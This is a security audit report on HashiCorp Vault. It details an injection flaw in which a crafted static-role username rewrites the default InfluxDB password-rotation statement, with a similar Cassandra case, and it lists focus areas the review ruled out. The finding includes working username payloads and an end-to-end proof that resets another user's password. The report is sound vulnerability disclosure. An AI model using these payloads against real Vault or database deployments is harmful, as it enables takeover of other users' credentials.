# Application Security Review — Vault @ 0513545dd

**Commit:** `0513545dd8213ffcbb3406c25cda69cd0a5b0e47`  
**Tree:** `1.18.0-beta1`

**Skip list honored** (not re-reported): audit RCE; identity root policy; AWS/Azure/cert/LDAP/userpass auth; ACME SSRF; MSSQL/Redshift/HANA/Snowflake/MySQL/Postgres REVOKE SQLi; SSH principals; GitHub Name/Slug; Duo IP MFA; UI OIDC redirect; RADIUS case; cert renewal AND/OR; ACL wildcards/slash; KVv2 traversal; LIST slash; generate-root DoS; recovery timing; OpenLDAP DisplayName LDIF; Elasticsearch path.Join; Postgres static-role username quote breakout.

---

## Finding 1 — HIGH — InfluxDB static-role default password rotation: double-quote IFQL injection

Distinct from the skipped PostgreSQL static-role quote breakout and from schema `REVOKE` SQLi CVEs. This bug is in the **InfluxDB** plugin’s default password-rotation template used by static roles.

| Field | Value |
| --- | --- |
| **Severity** | High |
| **CWE** | CWE-89 (Improper Neutralization of Special Elements in Query) |
| **Attacker** | Authenticated Vault principal with `create`/`update` on `database/static-roles/*` for an InfluxDB connection (delegated DB-onboarding; not root) |
| **Controlled input** | Static-role `username` (`framework.TypeString`, no identifier validation / quoting) |
| **Impact** | Arbitrary `SET PASSWORD` (and other IFQL reachable in one statement) as the Vault InfluxDB management user (typically admin): reset any user’s password, lock out operators, take over admin accounts |

### Attack path

1. Admin configures `database/config/<conn>` with `influxdb-database-plugin` and a privileged management user.
2. Attacker creates a static role with a malicious `username` and empty / omitted `rotation_statements` (defaults apply; also works when policy uses `denied_parameters = ["rotation_statements"]`):

   ```
   username = target" = 'owned'; --
   ```

3. On create (and later rotations), `setStaticAccount` → plugin `UpdateUser` → `changeUserPassword` substitutes into the default template via unescaped `QueryHelper`.
4. Resulting IFQL (single statement; `--` comments out the Vault-generated password clause):

   ```sql
   SET PASSWORD FOR "target" = 'owned'; --" = 'vault-rotated-never-applied';
   ```

5. `target` can authenticate with password `owned`. The Vault-generated password is never applied.

### Evidence (code)

Default rotation template (manual double quotes, not an identifier escaper):

```20:22:plugins/database/influxdb/influxdb.go
	defaultUserCreationIFQL           = `CREATE USER "{{username}}" WITH PASSWORD '{{password}}';`
	defaultUserDeletionIFQL           = `DROP USER "{{username}}";`
	defaultRootCredentialRotationIFQL = `SET PASSWORD FOR "{{username}}" = '{{password}}';`
```

Empty statements → default; raw map substitution:

```229:251:plugins/database/influxdb/influxdb.go
func (i *Influxdb) changeUserPassword(ctx context.Context, username string, changePassword *dbplugin.ChangePassword) error {
	// ...
	rotateIFQL := changePassword.Statements.Commands
	if len(rotateIFQL) == 0 {
		rotateIFQL = []string{defaultRootCredentialRotationIFQL}
	}
	// ...
			m := map[string]string{
				"username": username,
				"password": changePassword.NewPassword,
			}
			q := influx.NewQuery(dbutil.QueryHelper(query, m), "", "")
```

`QueryHelper` performs unescaped string replacement:

```21:28:sdk/database/helper/dbutil/dbutil.go
func QueryHelper(tpl string, data map[string]string) string {
	for k, v := range data {
		tpl = strings.ReplaceAll(tpl, fmt.Sprintf("{{%s}}", k), v)
	}
	return tpl
}
```

Static-role username accepted as unconstrained string; create immediately calls `setStaticAccount` → `UpdateUser`:

```191:194:builtin/logical/database/path_roles.go
		"username": {
			Type: framework.TypeString,
```

```409:414:builtin/logical/database/rotation.go
	updateReq := v5.UpdateUserRequest{
		Username: input.Role.StaticAccount.Username,
	}
	statements := v5.Statements{
		Commands: input.Role.Statements.Rotation,
	}
```

### E2E proof (InfluxDB 1.6.7, auth enabled)

Against a local InfluxDB with admin `vaultadmin` and user `target` (password `target-original`):

1. Executed the plugin’s exact render/execute path with  
   `username = target" = 'owned'; --`  
   → `SET PASSWORD FOR "target" = 'owned'; --" = 'vault-rotated-never-applied';`
2. Auth as `target` / `target-original` → **authorization failed**
3. Auth as `target` / `owned` → **SUCCESS** (`SHOW DATABASES`)
4. Auth as `target` / `vault-rotated-never-applied` → **authorization failed**

Same first-hop was also confirmed earlier for user `victim` (original password failed; `pwned-by-static-role` succeeded).

### Why medium+

Low-privilege authenticated role admin for a single database mount can reset passwords of **any** InfluxDB user the Vault connector can alter (including other admins), without write access to `database/config` or custom rotation statements. Impact is credential takeover on the connected InfluxDB, not merely info disclosure.

### Related (same anti-pattern, not separately scored)

Cassandra defaults use the same unescaped `QueryHelper` pattern:

```20:22:plugins/database/cassandra/cassandra.go
	defaultUserCreationCQL   = `CREATE USER '{{username}}' WITH PASSWORD '{{password}}' NOSUPERUSER;`
	defaultUserDeletionCQL   = `DROP USER '{{username}}';`
	defaultChangePasswordCQL = `ALTER USER '{{username}}' WITH PASSWORD '{{password}}';`
```

Malicious static username `admin' WITH PASSWORD 'pwned'; --` renders to  
`ALTER USER 'admin' WITH PASSWORD 'pwned'; --' WITH PASSWORD 'vault-rotated-secret';`.  
MongoDB is **not** affected the same way: usernames are passed as structured command fields, not interpolated into query text.

---

## Falsified focus areas (this run)

1. **AWS `path_roles` / policy_document readable by creds readers** — `roles/` and `creds/` are distinct paths; policy ACL grants are separate; returning `policy_document` on role read is intentional admin surface, not a creds-path leak.
2. **`vault/activity` / `ui_config` unauth leaks** — activity paths are not in `PathsSpecial.Unauthenticated`; require standard token ACL. UI unauth paths are limited to mounts/messages/openapi-style helpers already designed for the login UI.
3. **`sys/config/state` / `sys/health` unauth data leaks** — `config/state/sanitized` is authenticated (not on unauth list) and returns `SanitizedConfig()` only; health redacts version/cluster name when no valid token and redaction opts are set.
4. **Okta beyond known MFA** — `bypass_okta_mfa` is admin config only; group membership comes from Okta API `ListUserGroups` + local group map with no attacker-controlled LDAP/Okta filter injection on login.
5. **Cassandra/MongoDB DisplayName → default statements** — default username templates truncate/replace/lowercase DisplayName before use; DisplayName never lands raw in CQL. MongoDB uses BSON command structs. (Static-role username injection is the separate Influx/Cassandra issue above.)
6. **Request forwarding / `X-Vault-*` header injection** — `X-Vault-Forward` only honored when `AllowForwardingViaHeader()` is enabled; values other than `active-node` are ignored; forwarded proto is cluster-internal, not client-synthesized to the active node.
7. **Sealwrap unwrap authz** — `allowUnwraps` is toggled only by active-node lifecycle (`runUnwraps`/`stopUnwraps`); no HTTP unwrap API for low-priv tokens.
8. **Plugin multiplexing capability confusion** — multiplexing is advertised by the plugin and recorded in the catalog; no path found for a client to escalate into another mount’s plugin instance via mux negotiation alone.
9. **CHANGELOG SECURITY “unfixed in tree”** — SECURITY bullets present in this CHANGELOG refer to fixes already merged in earlier releases included in this 1.18.0-beta1 ancestry; post-tree HCSECs from later product lines were treated as skip-list / out-of-scope duplicates rather than new findings.
